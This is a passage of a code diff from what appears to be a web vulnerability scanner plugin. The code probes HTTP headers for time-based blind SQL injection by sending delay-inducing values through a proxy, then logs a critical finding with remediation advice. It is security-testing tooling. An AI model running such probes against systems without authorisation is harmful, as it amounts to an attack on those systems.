+                            if randomDelayMax > 0 {
+                                delay := randn(randomDelayMin, randomDelayMax)
+                                dur, _ := time.ParseDuration(sprintf("%dms", delay))
+                                time.Sleep(dur)
+                            }
+                            // resu2, err2 = freq.FuzzHTTPHeader(headerName, delayTestValue).ExecFirst(
+                            //     fuzz.WithTimeOut(16),
+                            //     fuzz.proxy(proxy1)
+                            // )
+                            delayTestReq = freq.OriginRequest
+                            delayTestReq.Header.Set(headerName, delayTestValue)
+                            delayTestFuzzer, err2 := createFuzzerWithProxy(delayTestReq, isHttps, proxy1)
+                            if err2 != nil {
+                                println(sprintf("创建延迟测试 fuzzer 失败: %v", err2))
+                                continue
+                            }
+                            resu2, err2 = delayTestFuzzer.ExecFirst(fuzz.WithTimeOut(httpTimeout + 6)) // 适当延长超时
+
+
+                            if err2 == nil && resu2.ServerDurationMs >= 4000 && resu2.ServerDurationMs <= 40000 {
+                                risk.NewRisk(
+                                    addr,
+                                    risk.title(sprintf("SQL注入 (Header): %s 参数%s存在时间盲注", url, headerName)),
+                                    risk.severity("critical"),
+                                    risk.parameter(headerName),
+                                    risk.payload(testValue),
+                                    risk.description("通过HTTP Header注入检测到SQL时间盲注"),
+                                    risk.solution("对所有HTTP Header输入进行过滤和转义"),
+                                    risk.typeVerbose("SQL注入漏洞"),
+                                    risk.request(resu2.RequestRaw),
+                                    risk.response(resu2.ResponseRaw),
+                                    risk.type("sqlinjection"),
+                                    risk.details({
+                                        "detection_method": "header_time_based",
+                                        "original_header": existingHeaders[headerName],
+                                        "response_time_ms": resu2.ServerDurationMs,
+                                        "header_name": headerName,
+                                        "verified_with_delay": true
+                                    })
+                                )
+                                break
+                            }
+                        }
+                    }
+                }
+            }
+
+        }(currentParam)
+    }
+    
+    wg.Wait()
+    println(sprintf("所有参数测试完成，共测试 %d 个参数", len(params)))
+}
